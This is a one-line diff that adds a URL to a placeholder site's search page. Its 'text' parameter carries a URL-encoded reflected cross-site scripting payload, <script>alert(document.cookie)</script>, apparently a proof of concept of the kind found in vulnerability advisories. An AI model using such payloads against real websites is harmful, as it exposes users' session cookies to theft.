@@ -1,0 +1,1 @@
+http://www.example.com/search.php?text=%3Cscript%3Ealert(document.cookie)%3C/script%3E&dosearch=Search
